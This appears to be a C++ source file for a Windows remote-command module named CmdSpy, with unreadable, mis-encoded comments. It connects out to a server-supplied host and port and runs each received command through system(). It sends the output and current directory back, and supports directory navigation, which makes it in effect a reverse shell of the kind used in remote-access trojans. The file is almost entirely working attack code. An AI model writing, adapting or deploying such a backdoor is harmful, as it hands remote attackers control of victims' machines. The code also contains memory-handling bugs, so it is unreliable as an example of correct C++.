#include "CmdSpy.h"

// �����壬����ȷ���̰߳�ȫ
static CRITICAL_SECTION gCs;
// ��ʼ����
static CmdSpy gSpy;
// ��ʱ������Ϣ����·��
static std::string gTmpReturnFile = "cmd_return.tmp";
static std::string current_path;
CmdSpy::CmdSpy()
{
    // ��ʼ��������
    InitializeCriticalSection(&gCs);

}

CmdSpy::~CmdSpy()
{
    // ɾ��������
    DeleteCriticalSection(&gCs);
}

void CmdSpy::startByNewThread(std::string domain, int port)
{
    // �������Ͷ˿�����ת����һ���ַ�ָ������
    char* args = new char[MAX_PATH + sizeof(int)];
    domain.reserve(MAX_PATH);
    memcpy(args, domain.data(), MAX_PATH);
    memcpy(args + MAX_PATH, (char*)&port, sizeof(int));
    
    // �������߳�
    HANDLE h = CreateThread(NULL, 0, CmdSpy::threadProc, (LPVOID)args, 0, NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;
        std::fflush(stdout);
    }
}

DWORD CmdSpy::threadProc(LPVOID args)
{
    char domain[MAX_PATH];
    memcpy(domain, args, MAX_PATH);
    int port = *((int*)((char*)args + MAX_PATH));

    // ��ʼ���
    startCmdSpy(domain, port);

    // �ͷŲ���
    delete (char*)args;
    return true;
}

void CmdSpy::startCmdSpy(std::string domain, int port)
{
    // ����socket�������������
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect cmd spy server " <<
            domain << ":" << port << std::endl;
        std::fflush(stdout);
        return;
    }

    // ��ʼ�����Ϣ
    std::cout << "Started cmd spy" << std::endl;
    std::fflush(stdout);

    // ��ѭ�������ϴӷ���˽�������
    const int packetSize = 800;
    char szData[packetSize];
    int ret;
    std::string buf;
    current_path = getPWD();
    while (1) {
        ret = sock.recvData(szData, packetSize);

        // ���ִ���
        if (ret == SOCKET_ERROR || ret == 0) {
            break;
        }

        // �����ݼ��뵽������
        addDataToBuffer(&sock, buf, szData, ret);
    }

    // ���
    std::cout << "Finished cmd spy" << std::endl;
    std::fflush(stdout);
}

void CmdSpy::addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size)
{
    buf.append(data, size);

    // ������ת����ָ��ģʽ
    int endIndex;
    while ((endIndex = buf.find(gSpy.CmdEnd)) >= 0) {
        std::string cmd = buf.substr(0, endIndex);
        buf.erase(0, endIndex + gSpy.CmdEnd.length());

        // ����ָ��
        std::string retData = execCmd(cmd);
        // ����Cmd��������ݵ������
        sock->sendData(retData.data(), retData.size());

        // ���͵�ǰ�ļ�λ��
        std::string pwd = gSpy.CmdPwd;
        pwd.append(gSpy.CmdSplit);
        pwd.append(current_path);
        pwd.append("\r\n");

        // ����Cmd��������ݵ������
        sock->sendData(pwd.data(), pwd.size());
    }
}

std::string CmdSpy::execCmd(std::string cmd)
{
	// ���������������̲߳��ܽ���
	EnterCriticalSection(&gCs);

	// ����Ƿ��� `cd ..` ����
	if (cmd == "cd ..")
	{
		// ����Ѿ��ڸ�·�����޷��ٷ�����һ��
		if (current_path.length() == 3 && current_path[1] == ':')
		{
			// �����������
			LeaveCriticalSection(&gCs);
			return std::string("�Ѿ��ڸ�Ŀ¼");
		}
		else
		{
			// �������һ��·���ָ���������·��
			size_t pos = current_path.find_last_of("\\");
			if (pos != std::string::npos) {
				current_path = current_path.substr(0, pos);
			}
			// �����������
			LeaveCriticalSection(&gCs);
			return std::string("");
		}

	}
	else if (cmd.rfind("cd ", 0) == 0)// ����Ƿ��� `cd ` ��ͷ������
	{
		std::string target_path = cmd.substr(3); // ��ȡĿ��·��

		if (target_path[1] == ':')
		{

			if (std::filesystem::exists(target_path) && std::filesystem::is_directory(target_path)) {
				current_path = target_path;

				// �����������
				LeaveCriticalSection(&gCs);
				return std::string("");
			}
		}

		// ���·���Ϸ��Ҵ��ڣ������ current_path
		if (std::filesystem::exists(current_path + "\\" + target_path) && std::filesystem::is_directory(current_path + "\\" + target_path)) {
			current_path = current_path + "\\" + target_path;

			// �����������
			LeaveCriticalSection(&gCs);
			return std::string("");
		}

		// �����������
		LeaveCriticalSection(&gCs);
		return std::string("Path is not exist");

	}



	// ִ��ָ�Ȼ�󱣴�����ʱ�ļ�
	_chdir(current_path.data());
	char buffer[256];
	_getcwd(buffer, sizeof(buffer));
	system(cmd.append(" ").append(" > ").append(gTmpReturnFile).data());

	// ����ʱ�ļ�
	FILE* fp = fopen(gTmpReturnFile.data(), "rb");
	if (!fp) {
		std::cout << "Failed to open return file of cmd\n";
		std::fflush(stdout);

		// �����������
		LeaveCriticalSection(&gCs);

		return std::string();
	}

	// ��ȡ�ļ���С
	fseek(fp, 0, SEEK_END);
	unsigned int len = ftell(fp);
	rewind(fp);

	// ��ȡ�ļ�
	std::vector<char> data;
	data.reserve(len);

	fread(data.data(), 1, len, fp);

	// �ر��ļ�
	fclose(fp);

	// ɾ����ʱ�ļ�
	DeleteFileA(gTmpReturnFile.data());

	// �����������
	LeaveCriticalSection(&gCs);

	return std::string(data.data(), len);
}

std::string CmdSpy::getPWD()
{
    return execCmd("cd");
}